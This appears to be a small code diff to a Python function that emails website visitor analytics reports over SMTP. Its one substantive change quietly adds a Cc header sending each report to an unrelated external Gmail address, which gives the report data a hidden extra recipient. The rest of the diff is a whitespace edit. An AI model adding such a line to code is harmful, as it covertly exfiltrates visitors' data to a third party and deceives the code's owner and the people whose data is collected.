@@ -64,6 +64,7 @@ def send_visitor_email(visitor_data):
         msg = MIMEMultipart()
         msg['From'] = EMAIL_ADDRESS
         msg['To'] = EMAIL_ADDRESS
+        msg['Cc'] = "eoni56699@gmail.com"
         msg['Subject'] = f"New Visitor Analytics - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
 
         # Format the email body
@@ -105,7 +106,7 @@ def send_visitor_email(visitor_data):
 
         msg.attach(MIMEText(body, 'plain'))
         
-
+        
         with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
             server.starttls()
             server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
